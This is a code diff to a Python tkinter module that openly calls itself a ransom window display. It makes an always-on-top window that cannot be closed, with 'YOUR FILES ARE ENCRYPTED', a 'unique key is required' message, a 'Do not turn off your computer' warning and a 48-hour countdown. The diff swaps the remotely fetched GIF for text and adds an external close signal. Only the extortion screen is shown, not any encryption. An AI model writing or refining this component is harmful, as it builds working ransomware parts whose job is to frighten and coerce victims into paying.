@@ -1,16 +1,18 @@
 """
-Ransom window display module.
-Creates an unclosable fullscreen window with GIF and countdown timer.
+Ransom window display module (simplified).
+Creates an unclosable, always-on-top compact window with a countdown timer
+and a prominent text message. GIF/remote asset loading removed per request.
 """
 import tkinter as tk
 from tkinter import Label
-from PIL import Image, ImageTk
-import requests
-from io import BytesIO
 import threading
 import time
 import sys
 import os
+
+
+# Global close signal shared between threads
+_close_signal = threading.Event()
 
 
 class RansomWindow:
@@ -18,16 +20,13 @@ class RansomWindow:
         self.root = tk.Tk()
         self.hours_remaining = hours
         self.seconds_remaining = hours * 3600
-        self.gif_frames = []
-        self.current_frame = 0
         self.setup_window()
         
     def setup_window(self):
         """Configure the window to be unclosable and compact."""
-        # Set window size to just fit the GIF (450x500 for GIF + timer)
-        window_width = 450
-        window_height = 520
-        
+        # Compact window size for timer + message
+        window_width = 520
+        window_height = 220
         # Center on screen
         screen_width = self.root.winfo_screenwidth()
         screen_height = self.root.winfo_screenheight()
@@ -64,118 +63,41 @@ class RansomWindow:
         )
         self.title_label.pack()
         
-        # GIF display
-        self.gif_label = Label(container, bg='#000000')
-        self.gif_label.pack(pady=5)
-        
-        # Minimal message text
-        message = "YOUR FILES ARE ENCRYPTED"
-        
+        # Message text (no images/GIFs)
         self.message_label = Label(
             container,
-            text=message,
-            font=('Courier New', 12, 'bold'),
+            text="YOUR FILES ARE ENCRYPTED",
+            font=('Courier New', 16, 'bold'),
             bg='#000000',
             fg='#ff0000',
-            pady=5
+            pady=8
         )
         self.message_label.pack()
-        
-        # Load and start GIF animation
-        self.load_gif()
+
+        self.note_label = Label(
+            container,
+            text=(
+                "A unique key is required to restore them.\n"
+                "Do not turn off your computer."
+            ),
+            font=('Courier New', 10),
+            bg='#000000',
+            fg='#ff5555'
+        )
+        self.note_label.pack()
         
         # Start countdown timer
         self.update_timer()
-        
-    def load_gif(self):
-        """Load the GIF from a local path first, then try network fallbacks."""
-        # 1) Local override via env
-        local_override = os.getenv("LOCAL_GIF_PATH")
-        # 2) Packaged asset path (if present)
-        assets_dir = os.path.join(os.path.dirname(__file__), "assets")
-        packaged = os.path.join(assets_dir, "warning.gif")
-        # 3) Remote URLs (try in order)
-        remote_urls = [
-            "https://media.tenor.com/YDgAmOKt0bMAAAAM/brown-recluse-fella.gif",
-            "https://media.giphy.com/media/xT1R9Zs6gttxyPjdVu/giphy.gif",
-        ]
-
-        def _load_from_fp(fp):
-            gif = Image.open(fp)
-            try:
-                while True:
-                    frame = gif.copy().resize((400, 400), Image.Resampling.LANCZOS)
-                    self.gif_frames.append(ImageTk.PhotoImage(frame))
-                    gif.seek(len(self.gif_frames))
-            except EOFError:
-                pass
-
-        # Try local override
-        try:
-            if local_override and os.path.exists(local_override):
-                print(f"[ransom_window] Loading local GIF: {local_override}")
-                _load_from_fp(local_override)
-        except Exception as e:
-            print(f"[ransom_window] Local override failed: {e}")
-
-        # Try packaged asset if nothing loaded yet
-        if not self.gif_frames:
-            try:
-                if os.path.exists(packaged):
-                    print(f"[ransom_window] Loading packaged GIF: {packaged}")
-                    _load_from_fp(packaged)
-            except Exception as e:
-                print(f"[ransom_window] Packaged asset failed: {e}")
-
-        # If no 'warning.gif', try any .gif in assets directory
-        if not self.gif_frames:
-            try:
-                if os.path.isdir(assets_dir):
-                    for name in os.listdir(assets_dir):
-                        if name.lower().endswith('.gif'):
-                            candidate = os.path.join(assets_dir, name)
-                            print(f"[ransom_window] Loading first found GIF: {candidate}")
-                            _load_from_fp(candidate)
-                            break
-            except Exception as e:
-                print(f"[ransom_window] Asset directory scan failed: {e}")
-
-        # Try remote URLs
-        if not self.gif_frames:
-            for url in remote_urls:
-                try:
-                    print(f"[ransom_window] Downloading GIF from {url} …")
-                    headers = {"User-Agent": "Mozilla/5.0 (RansomWindow)"}
-                    response = requests.get(url, headers=headers, timeout=15)
-                    response.raise_for_status()
-                    gif_data = BytesIO(response.content)
-                    _load_from_fp(gif_data)
-                    if self.gif_frames:
-                        break
-                except Exception as e:
-                    print(f"[ransom_window] Failed to fetch {url}: {e}")
-
-        # Finalize or show text fallback
-        if self.gif_frames:
-            print(f"[ransom_window] Loaded {len(self.gif_frames)} frames")
-            self.animate_gif()
-        else:
-            print("[ransom_window] No GIF available; showing text fallback")
-            self.gif_label.config(
-                text="⚠️ ENCRYPTION ACTIVE ⚠️",
-                font=('Courier New', 20, 'bold'),
-                fg='#ff0000'
-            )
-    
-    def animate_gif(self):
-        """Animate the GIF by cycling through frames."""
-        if self.gif_frames:
-            self.gif_label.config(image=self.gif_frames[self.current_frame])
-            self.current_frame = (self.current_frame + 1) % len(self.gif_frames)
-            self.root.after(50, self.animate_gif)  # ~20 FPS
     
     def update_timer(self):
         """Update countdown timer every second."""
+        # Allow external thread to request a clean shutdown
+        if _close_signal.is_set():
+            try:
+                self.root.destroy()
+            except Exception:
+                pass
+            return
         if self.seconds_remaining > 0:
             self.seconds_remaining -= 1
             
@@ -216,6 +138,12 @@ def show_ransom_window(hours=48, blocking=True):
         hours: Countdown time in hours (default 48)
         blocking: If True, blocks until window is closed. If False, runs in thread.
     """
+    # Reset any previous close request when showing a new window
+    try:
+        _close_signal.clear()
+    except Exception:
+        pass
+
     if blocking:
         window = RansomWindow(hours)
         window.show()
@@ -227,6 +155,18 @@ def show_ransom_window(hours=48, blocking=True):
         thread = threading.Thread(target=run_window, daemon=False)
         thread.start()
         return thread
+
+
+def close_ransom_window():
+    """Signal the running ransom window (if any) to close.
+
+    The window checks this flag once per second on its timer loop and will
+    destroy itself cleanly from the Tk thread.
+    """
+    try:
+        _close_signal.set()
+    except Exception:
+        pass
 
 
 if __name__ == "__main__":
